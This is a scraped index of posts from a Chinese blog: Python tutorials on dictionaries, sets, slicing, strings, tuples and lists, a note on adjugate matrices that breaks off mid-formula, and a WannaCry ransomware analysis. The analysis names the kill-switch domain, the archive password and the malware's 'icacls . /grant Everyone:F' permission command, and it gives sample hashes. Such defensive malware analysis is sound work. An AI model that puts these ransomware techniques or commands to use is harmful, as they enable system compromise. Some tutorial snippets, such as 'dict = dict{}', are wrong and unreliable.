Python中，字典（Dictionary）是一种内置的数据结构，用于存储键值对的集合。它是一种可变容器，允许用户存储任意类型的对象。字典中的每个元素由一个键（key）和一个值（value）组成，键和值之间用冒号（:）分隔，而各个键值对之间用逗号（,）分隔，整个字典被包含在花括号（{}）中。\n字典的定义 字典标准格式 1 2 3 4 5 # 定义字典变量 dict = {key:value,key:value,……,key:value} # 定义空字典 dict = {} dict = dict{} 使用例：\n1 2 # 使用字典记录学生及其成绩 dict = {\u0026#39;小明\u0026#39;:80,\u0026#39;小华\u0026#39;:84,\u0026#39;小红\u0026#39;:90} 字典数据的获取 字典不支持下标索引，可以通过Key值来取得对应的Value\n1 2 3 4 dict = {\u0026#39;小明\u0026#39;:80,\u0026#39;小华\u0026#39;:84,\u0026#39;小红\u0026#39;:90} print(dict[\u0026#39;小明\u0026#39;]) print(dict[\u0026#39;小华\u0026#39;]) print(dict[\u0026#39;小红\u0026#39;]) 字典的嵌套 字典的Key和Value可以是任意数据类型**（Key不可以是字典）**\n使用例：使用字典记录学生及其成绩\n姓名 语文 数学 英语 小明 77 66 33 小华 88 86 55 小红 99 96 66 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 score = { \u0026#39;小明\u0026#39;:{ \u0026#39;语文\u0026#39;:77, \u0026#39;数学\u0026#39;:66, \u0026#39;英语\u0026#39;:33 },\u0026#39;小华\u0026#39;:{ \u0026#39;语文\u0026#39;:88, \u0026#39;数学\u0026#39;:86, \u0026#39;英语\u0026#39;:55 },\u0026#39;小红\u0026#39;:{ \u0026#39;语文\u0026#39;:99, \u0026#39;数学\u0026#39;:96, \u0026#39;英语\u0026#39;:66 } } print(score) # 接下来是索引教程 # 此处查询小华的数学成绩 print(score[\u0026#39;小华\u0026#39;][\u0026#39;数学\u0026#39;])\t#输出 86 字典的常用操作 字典的新增元素 直接对新元素执行以下命令即可\n1 2 3 dict = {\u0026#39;小明\u0026#39;:80,\u0026#39;小华\u0026#39;:84,\u0026#39;小红\u0026#39;:90} dict[\u0026#39;小芳\u0026#39;] = 94 print(dict) 字典的更新/修改元素 字典Key不可重复，所以直接对已有元素执行以下命令即可\n1 2 3 dict = {\u0026#39;小明\u0026#39;:80,\u0026#39;小华\u0026#39;:84,\u0026#39;小红\u0026#39;:90} dict[\u0026#39;小明\u0026#39;] = 100 print(dict) 删除元素 pop 删除的同时取出元素\n1 2 3 4 dict = {\u0026#39;小明\u0026#39;:80,\u0026#39;小华\u0026#39;:84,\u0026#39;小红\u0026#39;:90} a = dict.pop(\u0026#39;小红\u0026#39;) print(dict) print(a) 清空字典 1 2 3 dict = {\u0026#39;小明\u0026#39;:80,\u0026#39;小华\u0026#39;:84,\u0026#39;小红\u0026#39;:90} dict.clear() print(dict) 获取全部的Key keys 和pop相同，你需要用变量来接收\n1 2 3 dict = {\u0026#39;小明\u0026#39;:80,\u0026#39;小华\u0026#39;:84,\u0026#39;小红\u0026#39;:90} a = dict.keys() print(a)\t# 输出 dict_keys([\u0026#39;小明\u0026#39;, \u0026#39;小华\u0026#39;, \u0026#39;小红\u0026#39;]) 统计字典内的元素数量 len 1 2 dict = {\u0026#39;小明\u0026#39;:80,\u0026#39;小华\u0026#39;:84,\u0026#39;小红\u0026#39;:90} print(len(dict)) 字典的遍历 由于不能通过下标索引，字典同样不支持while循环\nfor函数 方式一：使用 2.5获取全部的Key keys 处的指令\n1 2 3 4 dict = {\u0026#39;小明\u0026#39;:80,\u0026#39;小华\u0026#39;:84,\u0026#39;小红\u0026#39;:90} k = dict.keys()\t#此处的k本质是列表，所以接下来参考列表的遍历 for m in k: print(m,\u0026#39;的成绩是\u0026#39;,dict[m]) 方式二：直接遍历\n1 2 3 dict = {\u0026#39;小明\u0026#39;:80,\u0026#39;小华\u0026#39;:84,\u0026#39;小红\u0026#39;:90} for k in dict: print(k,\u0026#39;的成绩是\u0026#39;,dict[k]) ","date":"2025-11-07T22:21:09+08:00","permalink":"https://www.retr0.xyz/p/6.6-%E6%95%B0%E6%8D%AE%E5%AE%B9%E5%99%A8%E5%AD%97%E5%85%B8/","title":"6.6 数据容器：字典"},{"content":" 集合不支持元素的重复（自带去重功能），并且内容无序。\n集合的定义 1 2 3 4 5 # 定义集合变量 a = {1,2,3,4,5,4,3,2,1} # 定义空集合 b = set() print(a)\t# 输出{1, 2, 3, 4, 5} 发现自动去重 集合的常用操作 因为集合是无序的，所以集合**不支持下标索引**，但是集合是可以修改的\n添加新元素 add 1 2 3 4 a = {1,2,3,4,5,\u0026#39;hi\u0026#39;} a.add(\u0026#39;hello\u0026#39;)\t# 添加成功 a.add(\u0026#39;hi\u0026#39;)\t# 添加失败，因为被自动去重 print(a)\t# 输出{1, 2, 3, 4, 5, \u0026#39;hi\u0026#39;, \u0026#39;hello\u0026#39;} 移除元素 remove 1 2 3 a = {1,2,3,4,5,\u0026#39;hi\u0026#39;} a.remove(\u0026#39;hi\u0026#39;) print(a) 从集合中随机抽取元素 pop 1 2 3 4 a = {1,2,3,4,5,\u0026#39;hi\u0026#39;} b = a.pop() print(a) print(b) 注意：取出元素后集合本身被修改，对应元素移除，因此你需要用一个变量来接收取出的元素\n清空集合 clear 1 2 3 a = {1,2,3,4,5,\u0026#39;hi\u0026#39;} a.clear() print(a) 取出两个集合的差集 difference 语法：集合1.difference(集合2)，功能：取出集合1和集合2的差集 (集合1有而集合2没有的，即 C=A-A∩B)\n结果：得到一个新集合，集合1和集合2不变\n1 2 3 4 5 6 set1 = {1,2,3} set2 = {1,5,6} set3 = set1.difference(set2) print(set3)\t# 结果：{2,3} 得到的新集合 print(set1)\t# 结果：{1,2,3} 不变 print(set2)\t# 结果：{1,5,6} 不变 消除两个集合的差集 语法：集合1.difference_update(集合2)\n功能：对比集合1和集合2，在集合1内，删除和集合2相同的元素（即 A=A-A∩B）\n因此只有集合1被修改，不会产生新的集合。\n1 2 3 4 5 set1 = {1,2,3} set2 = {1,5,6} set1.difference_update(set2) print(set1)\t# 结果{2, 3}，被修改 print(set2)\t# 结果{1,5,6}，不变 两个集合合并 语法：集合1.union(集合2)\n功能：将集合1和集合2合并为新集合\n1 2 3 4 5 6 set1 = {1,2,3} set2 = {1,5,6} set3 = set1.union(set2) print(set3)\t# 结果：{1,2,3,5,6}，新集合 print(set1)\t# 结果：{1,2,3}，不变 print(set2)\t# 结果：{1,5,6}，不变 统计集合元素数量 1 2 a = {1,2,3,4,5,\u0026#39;hi\u0026#39;} print(len(a)) 集合的循环遍历 注意：因为集合不支持下标索引，所以无法为while循环提供条件，因此只能使用for循环\nfor循环 1 2 3 a = {1,2,3,4,5,\u0026#39;hi\u0026#39;} for element in a: print(element) ","date":"2025-11-06T22:30:30+08:00","permalink":"https://www.retr0.xyz/p/6.5-%E6%95%B0%E6%8D%AE%E5%AE%B9%E5%99%A8%E9%9B%86%E5%90%88/","title":"6.5 数据容器：集合"},{"content":" 序列是指：内容连续、有序，可使用下标索引的一类数据容器\n列表、元组、字符串，均可以视为序列。\n序列的切片 切片：从一个序列中，取出一个子序列。\n语法：序列[起始下标:结束下标:步长]\n表示从序列中,从指定位置开始,依次取出元素,到指定位置结束,得到一个新序列:\n起始下标表示从何处开始,可以留空,留空视作从头开始 结束下标**(不含)**表示何处结束,可以留空,留空视作截取到结尾(包含尾部) 步长表示,依次取元素的间隔 步长1表示,一个个取元素(默认为1) 步长2表示,每次跳过1个元素取 步长N表示,每次跳过N-1个元素取 步长为负数表示,反向取(注意,起始下标和结束下标也要反向标记) 注意：切片操作不会对原序列进行修改，而是会得到新的序列\n示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # 对List进行切片,从1开始,4结束,步长1 list = [0,1,2,3,4,5,6] print(list[1:4])\t#输出[1, 2, 3] # 对tuple进行切片,从头开始,到最后结束,步长1 tuple = (0,1,2,3,4,5,6) print(tuple[:])\t#输出(0, 1, 2, 3, 4, 5, 6) # 对str进行切片,从头开始,到最后结束,步长2 str = \u0026#39;01234567\u0026#39; print(str[::2])\t#输出0246 # 对str进行切片,从头开始,到最后结束,步长-1 str = \u0026#39;01234567\u0026#39; print(str[::-1])\t#输出76543210 # 对列表进行切片,从3开始,到1结束,步长-1 list = [0,1,2,3,4,5,6] print(list[3:1:-1])\t#输出[3, 2] #对元组进行切片,从头开始,到尾结束,步长-2 tuple = (0,1,2,3,4,5,6) print(tuple[::-2])\t#输出(6, 4, 2, 0) ","date":"2025-11-05T18:17:46+08:00","permalink":"https://www.retr0.xyz/p/6.4-%E5%BA%8F%E5%88%97%E7%9A%84%E6%93%8D%E4%BD%9C%E5%88%87%E7%89%87/","title":"6.4 序列的操作：切片"},{"content":" 字符串是字符的容器，一个字符串可以存放任意数量的字符。字符串同样无法修改。\n字符串的定义 字符串中的每个字符都为一个元素，同样可以用下标号索引，例如：\n1 2 3 s = \u0026#39;hello\u0026#39; print(s[0])\t#输出h print(s[-1])\t#输出o 此外，需要注意空格也属于一种字符\n1 2 3 s = \u0026#39;you and me\u0026#39; print(s[3]) print(s[-3])\t#输出空格 字符串的常用操作 找到特定字符串的下标 1 2 s = \u0026#39;you and me\u0026#39; print(s.index(\u0026#39;and\u0026#39;))\t#输出4 字符串的替换 1 2 3 4 s1 = \u0026#39;12345666\u0026#39; s2 = s1.replace(\u0026#39;6\u0026#39;,\u0026#39;7\u0026#39;)\t#字符串.replace（‘要替换的字符’，‘替换后的字符’） print(s1)\t#输出12345666 print(s2)\t#输出12345777 可见replace并没有修改字符串本身，而是产生了一个新字符串，因此你需要一个变量来接收它\n字符串的分割 1 2 3 4 s1 = \u0026#39;you and me\u0026#39; s2 = s1.split(\u0026#39; \u0026#39;)\t#字符串.split(\u0026#39;分割依据\u0026#39;) print(s1)\t#输出you and me print(s2)\t#输出[\u0026#39;you\u0026#39;, \u0026#39;and\u0026#39;, \u0026#39;me\u0026#39;] 在括号内填入你想要按照哪一个字符分割后，split会将原字符串分割为若干元素并装入一个列表\n但是原字符串仍被未修改，因此你需要一个变量来接收分割结果\n字符串的规整操作 当括号内不填参数时，strip会去除字符串前后的空格\n1 2 s = \u0026#39; you and me \u0026#39; print(s.strip())\t#输出you and me 当括号内填入参数后，strip会去除字符串首尾全部满足参数的字符（不严格：满足参数的任意字符就去除）例：\n1 2 s = \u0026#39;23you and me34\u0026#39; print(s.strip(\u0026#39;234\u0026#39;))\t#输出you and me 此处表明于strip并不是找到'234\u0026rsquo;这一整体才去除，而是把'2\u0026rsquo;、\u0026lsquo;3\u0026rsquo;、\u0026lsquo;4\u0026rsquo;分别都去除\n统计字符串中某字符串出现的次数 1 2 s = \u0026#39;itheima and itcast\u0026#39; print(s.count(\u0026#39;it\u0026#39;))\t#输出2 严格按照所查找字符串整体查找，区分大小写\n统计字符串的长度 同样包括空格，用法与之前相同\n1 2 s = \u0026#39;you and me\u0026#39; print(len(s))\t#输出10 字符串的遍历 while循环 示例：\n1 2 3 4 5 6 s = \u0026#39;12345\u0026#39; index = 0 while index \u0026lt; len(s): a = s[index] print(a)\t#对元素a进行处理 index += 1 for循环 示例：\n1 2 3 4 s = \u0026#39;12345\u0026#39; for i in range (0,len(s)): a = s[i] print(a) ","date":"2025-11-04T17:45:08+08:00","permalink":"https://www.retr0.xyz/p/6.3-%E6%95%B0%E6%8D%AE%E5%AE%B9%E5%99%A8%E5%AD%97%E7%AC%A6%E4%B8%B2/","title":"6.3 数据容器：字符串"},{"content":" 什么是元组？\n元组是Python中的一种基本数据结构，它是一个不可变的序列，意味着一旦创建，元组中的元素不能被修改、添加或删除。\n元组的定义 定义元组使用小括号，且用逗号隔开各个数据，数据可以是不同数据类型\n1 2 3 4 tuple = (1,2,\u0026#39;ok\u0026#39;,4,5,True) #定义空元组 a = ()\t#方式1 b = tuple()\t#方式2 注意：如果元组中只有一个元素，它的后面也要加上逗号，例如\n1 tuple = (\u0026#39;hello\u0026#39;,) 此外，元组也可以嵌套\n1 tuple = ((1,2,3),(4,5,6)) 元组的常用操作\t（同列表基本一致） 元组的索引 元组同样支持通过下标号正反向索引\n1 2 3 t = (\u0026#39;一\u0026#39;,\u0026#39;二\u0026#39;,\u0026#39;三\u0026#39;,\u0026#39;四\u0026#39;,\u0026#39;五\u0026#39;) print(t[0]) print(t[-1]) 查询元组中元素的下标号 同样只查询到第一个匹配的元素\n1 2 t = (\u0026#39;一\u0026#39;,\u0026#39;二\u0026#39;,\u0026#39;三\u0026#39;,\u0026#39;四\u0026#39;,\u0026#39;五\u0026#39;) print(t.index(\u0026#39;三\u0026#39;)) 统计某元素在元组中的数量 1 2 t = (1,2,3,2,4,2,5) print(t.count(2)) 统计元组内全部元素数量 1 2 t = (\u0026#39;一\u0026#39;,\u0026#39;二\u0026#39;,\u0026#39;三\u0026#39;,\u0026#39;四\u0026#39;,\u0026#39;五\u0026#39;) print(len(t)) 特别：修改元组内的列表的元素 1 2 3 t1 = (1,2,[\u0026#39;a\u0026#39;,\u0026#39;b\u0026#39;,\u0026#39;hello\u0026#39;]) t1[2][2] = \u0026#39;c\u0026#39; print(t1) 元组的循环遍历 while循环 示例：\n1 2 3 4 5 6 t = (1,2,3,4,5) index = 0 while index \u0026lt; len(t): a = t[index] print(a)\t#对元素a进行处理 index += 1 for循环 示例：\n1 2 3 4 t = (1,2,3,4,5) for i in range (0,len(t)): a = t[i] print(a) ","date":"2025-11-03T18:14:15+08:00","permalink":"https://www.retr0.xyz/p/6.2-%E6%95%B0%E6%8D%AE%E5%AE%B9%E5%99%A8%E5%85%83%E7%BB%84/","title":"6.2 数据容器：元组"},{"content":"一、事件概述 1. 攻击爆发与范围 时间：2017 年 5 月 12 日，黑客利用美国国家安全局（NSA）泄露的 \u0026ldquo;永恒之蓝\u0026rdquo;（EternalBlue）漏洞发动攻击，迅速波及全球。\n规模：超过 150 个国家、30 多万台设备被感染，包括英国 NHS 医院、中国高校、俄罗斯电信公司等关键基础设施。\n行业影响：医疗系统瘫痪导致手术延误，教育机构数据丢失影响毕业季，物流企业供应链中断，全球经济损失估算达40 亿至 500 亿美元。\n被入侵的公安网 某加油站中毒 某高校机房中毒 2. 传播与加密机制 蠕虫式传播：病毒通过扫描开放 445 端口（SMB 协议）的 Windows 设备，利用 \u0026ldquo;永恒之蓝\u0026rdquo; 漏洞自动植入恶意代码，无需用户交互即可横向扩散。\n文件加密：感染设备后，病毒使用AES-256 对称加密和RSA-1024 非对称加密组合，将文档、照片、数据库等文件后缀改为.wncry，并在桌面显示勒索弹窗。\n赎金要求：索要 300-600 美元比特币，付款后承诺提供解密密钥，但实际仅有少数受害者成功恢复数据。\n3. 关键转折点 Kill Switch（自毁开关）：病毒代码中隐藏了一个检测特定域名（iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com）是否存在的机制。英国安全研究员马库斯・哈钦斯（Marcus Hutchins）以 8 英镑注册该域名，意外触发病毒自毁，阻止了约 10 万台设备感染。\n当时媒体对马库斯・哈钦斯的报道 变种威胁：5 月 14 日出现的 WannaCry 2.0 移除了 Kill Switch，传播速度更快，但未造成大规模二次爆发。\n二、病毒原理简单解析 1. 漏洞利用：永恒之蓝（MS17-010） 漏洞背景：该漏洞存在于 Windows SMBv1 协议实现中，攻击者通过发送特制数据包触发内存错误，实现远程代码执行（RCE）。 攻击流程： 扫描阶段：病毒通过 445 端口向目标主机发送 SMB 请求，探测是否存在漏洞。 漏洞触发：构造包含恶意指令的数据包，利用 SMB 协议中的缓冲区溢出漏洞，覆盖内存中的返回地址。 代码执行：强制目标系统执行病毒 Payload，下载并运行 WannaCry 本体。 2. 加密流程 密钥生成：每台感染设备生成唯一的 AES-256 密钥用于文件加密，该密钥再通过攻击者的 RSA 公钥加密后上传至控制服务器。 文件锁定：病毒遍历系统磁盘，对文档（.doc/.xls）、媒体（.mp4/.jpg）、数据库（.mdb/.sql）等 70 余种格式文件进行加密，同时删除原始文件备份。 3. 传播扩散 横向移动：成功感染一台设备后，病毒通过以下方式继续传播： 漏洞复用：利用相同的永恒之蓝漏洞攻击局域网内其他未打补丁的设备。 共享渗透：扫描网络共享目录，尝试弱密码登录并植入病毒。 传播速度：由于许多企业未及时更新系统（如 Windows XP、Server 2003），病毒在数小时内形成全球扩散。 三、样本深度分析 该病毒分为两个部分：\n蠕虫部分，用于病毒传播，并释放出勒索病毒。\n勒索病毒部分，加密用户文件索要赎金。\n1. 蠕虫部分详细分析： 1.蠕虫代码运行后先会连接域名：http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com 如果该域名可以成功连接，则直接退出。\n关于这个“Kill Switch”的存在网络上众说纷纭，我们认为相对可靠的解释是：开关的存在是为了检测安全软件沙箱。这种手法多见于恶意代码混淆器，但是除了看到几个人为修改“Kill Switch”的样本外，该病毒并没有批量生成、混淆的迹象。另外，如果真是为了对抗安全软件沙箱，和以往对抗沙箱的样本比起来，这段代码过于简单，而且出现的位置也过于明显。所以，放置这样一个“低级”的“Kill Switch”具体出于何种原因，恐怕只有恶意代码作者能够解释了。\n2. 如果上述域名无法访问，则会安装病毒服务，服务的二进制文件路径为当前进程文件路径，参数为：-m security，并启动服务。\n3. 释放资源到C:WINDOWS目录下的tasksche.exe（该程序是勒索病毒），并将其启动。\n4. 蠕虫病毒服务启动后，会利用MS17-010漏洞传播。传播分为两种渠道，一种是局域网传播，另一种是公网传播。如下图所示：\n局域网传播主要代码如下图：\n病毒会根据用户计算机内网IP，生成覆盖整个局域网网段表，然后循环依次尝试攻击。相关代码如下：\n公网传播主要代码如下图，病毒会随机生成IP地址，尝试发送攻击代码。\nSMB漏洞攻击数据包数据，如下图所示：\nWorm病毒的PE文件中包含有两个动态库文件，是攻击模块的Payload，分别是：x86版本的payload，大小0x4060和x64版本的payload，大小0xc8a4。\n两个Payload都是只有资源目录结构没有具体资源的无效PE动态库文件。病毒在攻击前，会构造两块内存，在内存中分别组合Payload和打开Worm病毒自身，凑成有效攻击Payload，代码如下图所示：\n有效攻击Payload模型如下：\n完整的攻击Payload的资源如下图，资源中的第一个DWORD是病毒大小，之后就是病毒本身。\n然后使用MS17-010漏洞，通过APC方式注入动态库到被攻击计算机的Lsass.exe，并执行Payload动态库的导出函数PlayGame，该函数非常简单，功能就是释放资源“W”到被攻击计算机“C:Windowsmssecsvc.exe”，并执行，如下图所示：\n火绒剑监控被攻击计算机的如下：\n被攻击的计算机包含病毒的完整功能，除了会被勒索，还会继续使用MS17-010漏洞进行传播，这种传播呈几何级向外扩张，这也是该病毒短时间内大规模爆发的主要原因。如下图：\n目前，攻击内网IP需要用户计算机直接暴露在公网且没有安装相应操作系统补丁的计算机才会受到影响，因此那些通过路由拨号的个人用户，并不会直接通过公网被攻击。如果企业网络也是通过总路由出口访问公网的，那么企业网络中的电脑也不会受到来自公网的直接攻击。但是，现实中一些机构的网络存在直接连接公网的电脑，且内部网络又类似一个大局域网，因此一旦暴露在公网上的电脑被攻破，就会导致整个局域网存在被感染的风险。\n2. 勒索病毒部分详细分析： 1. 该程序资源中包含带有密码的压缩文件，使用密码“WNcry@2ol7”解压之后释放出一组文件：\na) taskdl.exe，删除临时目录下的所有“*.WNCRYT”扩展名的临时文件。\nb) taskse.exe，以任意session运行指定程序。\nc) u.wnry，解密程序，释放后名为@WanaDecryptor@.exe。\nd) b.wnry勒索图片资源。\ne) s.wnry，包含洋葱路由器组件的压缩包。病毒作者将勒索服务器搭建在”暗网”，需要通过tor.exe和服务器进行通信。\nf) c.wnry，洋葱路由器地址信息。\ng) t.wnry，解密后得到加密文件主要逻辑代码。\nh) r.wnry，勒索Q\u0026amp;A。\n2. 通过命令行修改所有文件的权限为完全访问权限。命令行如下：\nicacls . /grant Everyone:F /T /C /Q\n3. 解密t.wnry文件数据得到含有主要加密逻辑代码的动态库，通过其模拟的LoadLibrary和GetProcAddress函数调用该动态库中的导出函数执行其加密逻辑。\n调用勒索动态库代码，如下图所示：\n勒索主逻辑执行，先会导入一个存放在镜像中的RSA公钥，之后调用CryptGenKey生成一组RSA算法的Session key。之后将这组Key的公钥通过CryptExportKey导出，再写入到00000000.pky文件中。将Session key中的私钥用刚导入RSA公钥进行加密，存放在00000000.eky如下图所示： 如果遍历到的文件扩展名在欲加密的文件扩展名列表中，如下图所示：\n对于每个需要加密的文件，都会调用CryptGenRadom随机生成AES密钥，之后使用Session Key中的RSA公钥对AES密钥进行加密，存放在加密后的数据文件头中，之后将原始文件数据用该AES密钥进行加密。如下图所示：\n整体加密流程，如下图所示：\n因为病毒是生成加密过的用户文件后再删除原始文件，所以存在通过文件恢复类工具恢复原始未加密文件的可能。但是因为病毒对文件系统的修改操作过于频繁，导致被删除的原始文件数据块被覆盖，致使实际恢复效果有限。且随着系统持续运行，恢复类工具恢复数据的可能性会显著降低。\n四、 关于“WannaCry”新变种的说明\n早期版本的“WannaCry”病毒存在“Kill Switch”开关，也就是病毒中检测“http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com”这个网址是否可以访问的代码片段，如果可以访问则不会利用“永恒之蓝”漏洞继续传播。\n现在这个域名已经被注册，这个版本“WannaCry”传播功能等于已经关闭，因为这段代码本身没有加密，所以很可能会被得到改病毒样本的“骇客”修改，放开开关，使病毒继续传播。\n截止到今日，收集到的所谓“WannaCry”最新版本的“变种”，正如我们推测的一样，网上两个“热炒\u0026quot;变种, SHA256分别为：\n32f24601153be0885f11d62e0a8a2f0280a2034fc981d8184180c5d3b1b9e8cf\nc8d816410ebfb134ee14d287a34cea9d34d627a2c5e16234ab726cf9fde47ec6\n和早期的“WannaCry”相比\nSHA256：24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c\n有明显人为修改痕迹，如下图所示：\n这个样本仅仅是16进制修改了两个字节，让\u0026quot;Kill Switch\u0026quot;失效，这个修改不会影响检测。\n另外一个样本除了修改了\u0026quot;Kill Switch\u0026quot;域名，还修改了病毒携带勒索模块。经过测试勒索代码已经被修改坏了，无法运行。如下图：\n除了以上两个样本，火绒还截获另一个人为修改的” WannaCry “样本，同样被修改的不能运行\nSHA256如下：\n99c0d50b088df94cb0b150a203de6433cb97d4f8fd3b106ce442757c5faa35c4\n","date":"2025-11-03T13:18:39+08:00","image":"https://s.secrss.com/anquanneican/eba6dc46083f85d24ac9474fa735590a.jpg","permalink":"https://www.retr0.xyz/p/%E5%9B%9E%E5%BF%86%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92wannacry%E6%B7%B1%E5%BA%A6%E5%89%96%E6%9E%90/","title":"回忆勒索病毒WannaCry：深度剖析"},{"content":"列表的标准定义形式 1 list = [1,2,\u0026#39;三\u0026#39;,d,\u0026#39;我是一个元素\u0026#39;] 列表的常用操作 正向索引： 注意正向索引时从列表内第一个元素开始，其下标号为0，向右以此为1、2、3……\n反向索引：注意反向索引时从列表内倒数第一个元素开始，其下标号为-1，向左以此为-2、-3……\n1 list[N] #其中N为列表元素的下标号，‘list’要换为实际列表名 查询列表中元素的下标号 1 list.index(\u0026#39;我是一个元素\u0026#39;)\t#‘list’要换为实际列表名 特别地，对于嵌套列表需要指定除了所查询元素在其列表的下标号之外的所有下标号，例如\n1 2 list = [[1,2,3],[4,5,6],[7,8,9]] print(list[1].index(5))\t#此处我们查询元素‘5’的下标号 修改指定位置的元素 支持正反索引下标号\n1 list[2] = \u0026#39;example\u0026#39;\t#列表[下标] = 值 列表的插入 1 2 3 list = [1,2,3,4] list.insert(1,\u0026#39;Hello\u0026#39;)\t#列表.insert(下标，值)\t在所填下标之前插入一个值 print(list) 列表的追加 追加单个元素\n1 2 3 list = [1,2,3,4] list.append(\u0026#39;五\u0026#39;)\t#列表.append(值)\t在列表尾追加一个元素 print(list) 追加一批元素\n1 2 3 4 list1 = [1,2,3,4] list2 = [5,6,7] list1.extend(list2)\t#列表.extend(数据容器)\t在列表尾导入一批元素，此处括号内直接填写也可以 print(list1) 删除元素 方法一：del指定下标删除\t注意：由于del是Python主环境中的一个关键字，所以到此只有它的语法是放在列表名前面的\n1 2 3 list = [1,2,3] del list[0]\t#del 列表[下标] print(list) 方法二：pop取出\n1 2 3 4 list = [1,2,3] a = list.pop(0)\t#列表.pop(下标) print(list) print(a)\t#获取被取出的元素 方法三：remove指定内容删除\t注意：remove方法会从前往后依次检索列表中的元素，并删除第一个匹配的元素，如果想删除多个相同元素，请执行多次remove\n1 2 3 list = [\u0026#39;一\u0026#39;,\u0026#39;二\u0026#39;,\u0026#39;删我\u0026#39;,\u0026#39;三\u0026#39;,\u0026#39;删我\u0026#39;] list.remove(\u0026#39;删我\u0026#39;)\t#列表.remove(元素值) print(list) 清空列表 1 2 3 list = [1,2,3] list.clear()\t#列表.clear() print(list) 统计某元素在列表中的数量 1 2 list = [1,2,3,2,8,2,5,2]\tprint(list.count(2))\t#列表.count(元素值) 统计列表内全部元素数量 注意：它的语法也是放在列表名前面的\n1 2 list = [1,2,3,2,8,2,5,2]\tprint(len(list))\t#len(列表) 列表的排序 sort()函数 默认升序（数字从小到大，首字母从前到后），且会修改当前列表\n1 2 3 4 5 6 list1 = [10, 8, 3, 22, 33, 7, 11, 100, 54] list2 = [\u0026#39;f\u0026#39;,\u0026#39;b\u0026#39;,\u0026#39;d\u0026#39;,\u0026#39;c\u0026#39;,\u0026#39;a\u0026#39;,\u0026#39;e\u0026#39;] list1.sort() list2.sort() print(list1) print(list2) 可选参数：reverse\t降序\n1 2 3 list = [1,2,3,4,5] list.sort(reverse=True) print(list) 可选参数：key\t自定义排序\n1 2 3 list = [\u0026#39;java\u0026#39;,\u0026#39;python\u0026#39;,\u0026#39;C++\u0026#39;,\u0026#39;go\u0026#39;] list.sort(key=len)\t#此处以长度为参考量，仅为其中一种用法 print(list) 你也可以将其组合\n1 2 3 list = [\u0026#39;java\u0026#39;,\u0026#39;python\u0026#39;,\u0026#39;C++\u0026#39;,\u0026#39;go\u0026#39;] list.sort(key=len,reverse=True)\tprint(list) sorted()函数 用法与sort()一致，但是不会修改列表本身，而是将修改后的列表创建一个副本。简而言之，你需要一个变量来接收它。\n1 2 3 list = [\u0026#39;java\u0026#39;,\u0026#39;python\u0026#39;,\u0026#39;C++\u0026#39;,\u0026#39;go\u0026#39;] a = sorted(list,key=len,reverse=True) print(a) 我们来比较一下二者的区别\n1 2 3 4 5 6 7 8 list1 = [5,4,3,2,1] list2 = [5,4,3,2,1] list3 = list1.sort() list4 = sorted(list2) print(list1)\t#[1, 2, 3, 4, 5]\t列表本身也被修改 print(list2)\t#[5, 4, 3, 2, 1]\t可见列表本身未被修改 print(list3)\t#None\t因为sort()函数不会传出修改后的列表 print(list4)\t#[1, 2, 3, 4, 5]\t列表的循环遍历 while循环 示例：\n1 2 3 4 5 6 list = [1,2,3,4,5] index = 0 while index \u0026lt; len(list): a = list[index] print(a)\t#对元素a进行处理 index += 1 for循环 示例：\n1 2 3 4 list = [1,2,3,4,5] for i in range (0,len(list)): a = list[i] print(a) ","date":"2025-11-02T22:54:24+08:00","permalink":"https://www.retr0.xyz/p/6.1-%E6%95%B0%E6%8D%AE%E5%AE%B9%E5%99%A8%E5%88%97%E8%A1%A8/","title":"6.1 数据容器：列表"},{"content":"一、伴随矩阵与伴随矩阵法求逆矩阵 1. 伴随矩阵的定义 对于n阶方阵$A = (a_{ij})$，其代数余子式$A_{ij}$定义为：$A_{ij} = (-1)^{i+j}M_{ij}$，其中$M_{ij}$是$A$中去掉第$i$行第$j$列后剩余子矩阵的行列式（即余子式）。\n伴随矩阵$A^*$是由$A$的代数余子式按转置顺序排列而成的矩阵，即： $$ A^* = \\begin{pmatrix} A_{11} \u0026 A_{21} \u0026 \\cdots \u0026 A_{n1} \\\\ A_{12} \u0026 A_{22} \u0026 \\cdots \u0026 A_{n2} \\\\ \\vdots \u0026 \\vdots \u0026 \\ddots \u0026 \\vdots \\\\ A_{1n} \u0026 A_{2n} \u0026 \\cdots \u0026 A_{nn} \\end{pmatrix} $$2. 伴随矩阵的核心性质 对于任意n阶方阵$A$，有： $$ A \\cdot A^* = A^* \\cdot A = |A|I_n $$ 其中$|A|$是$A$的行列式，$I_n$是n阶单位矩阵。\n3. 伴随矩阵法求逆矩阵 可逆条件：矩阵$A$可逆的充要条件是$|A| \\neq 0$。\n逆矩阵公式：若$|A| \\neq 0$，则$A$的逆矩阵为： $$ A^{-1} = \\frac{1}{|A|}A^* $$推导过程：由$A \\cdot A^* = |A|I_n$，两边同时除以$|A|$（因$|A| \\neq 0$），得： $$ A \\cdot \\frac{1}{|A|}A^* = I_n $$ 根据逆矩阵的定义，可知$\\frac{1}{|A|}A^$是$A$的逆矩阵，即$A^{-1} = \\frac{1}{|A|}A^$。\n4. 示例：用伴随矩阵法求2阶矩阵的逆 设$A = \\begin{pmatrix} 1 \u0026amp; 2 \\ 3 \u0026amp; 4 \\end{pmatrix}$，求$A^{-1}$。\n步骤1：计算行列式$|A|$ $$ |A| = 1 \\times 4 - 2 \\times 3 = 4 - 6 = -2 \\neq 0 $$ 故$A$可逆。\n步骤2：计算代数余子式，构造伴随矩阵$A^*$\n$A_{11} = (-1)^{1+1} \\times 4 = 4$，$A_{12} = (-1)^{1+2} \\times 3 = -3$ $A_{21} = (-1)^{2+1} \\times 2 = -2$，$A_{22} = (-1)^{2+2} \\times 1 = 1$ 因此，伴随矩阵： $$ A^* = \\begin{pmatrix} A_{11} \u0026 A_{21} \\\\ A_{12} \u0026 A_{22} \\end{pmatrix} = \\begin{pmatrix} 4 \u0026 -2 \\\\ -3 \u0026 1 \\end{pmatrix} $$ 步骤3：代入逆矩阵公式 $$ A^{-1} = \\frac{1}{|A|}A^* = \\frac{1}{-2} \\begin{pmatrix} 4 \u0026 -2 \\\\ -3 \u0026 1 \\end{pmatrix} = \\begin{pmatrix} -2 \u0026 1 \\\\ \\frac{3}{2} \u0026 -\\frac{1}{2} 